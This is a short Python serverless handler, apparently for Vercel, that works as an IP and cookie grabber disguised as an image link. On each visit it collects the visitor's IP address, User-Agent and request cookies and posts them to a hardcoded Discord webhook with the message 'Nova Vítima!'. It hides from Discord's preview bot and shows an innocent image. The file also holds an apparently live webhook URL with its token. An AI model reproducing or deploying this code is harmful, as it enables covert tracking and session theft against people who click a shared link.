# api/index.py
from http.server import BaseHTTPRequestHandler
import json, requests, os, urllib.parse

# --- CONFIGURAÇÕES (COLOQUE SEU WEBHOOK AQUI) ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1496179801319538979/VN1XCcqaHxO62SDo41H7vp_bc99A0F_u-coxoc0sxoQd2G3cQyFDlscc4AR3SgdsjdXT"
IMAGE_URL = "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"

# --- FUNÇÃO PARA ENVIAR DADOS AO WEBHOOK ---
def send_to_discord(ip, user_agent, cookies):
    data = {
        "content": "@everyone **Nova Vítima!**",
        "embeds": [{
            "title": "Dados Capturados",
            "color": 0x00FFFF,
            "fields": [
                {"name": "🌐 IP", "value": ip, "inline": True},
                {"name": "🍪 Cookies", "value": f"```json\n{json.dumps(cookies, indent=2)[:500]}\n```", "inline": False},
                {"name": "📱 User-Agent", "value": user_agent, "inline": False}
            ]
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except: pass

# --- HANDLER PRINCIPAL (O ENTRYPOINT) ---
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Coleta os dados da requisição
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        user_agent = self.headers.get('User-Agent', 'Desconhecido')
        
        # 2. Coleta os cookies
        cookie_header = self.headers.get('Cookie', '')
        cookies = {}
        for item in cookie_header.split(';'):
            item = item.strip()
            if '=' in item:
                k, v = item.split('=', 1)
                cookies[k] = v
        
        # 3. Envia para o Discord (se não for um bot conhecido)
        is_discord_bot = 'discord' in user_agent.lower()
        if not is_discord_bot:
            send_to_discord(client_ip, user_agent, cookies)
        
        # 4. Retorna a página HTML com a imagem
        html = f'<html><body style="margin:0"><img src="{IMAGE_URL}" style="width:100%; height:auto;"></body></html>'
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

# Isso é necessário para a Vercel encontrar o entrypoint
app = handler
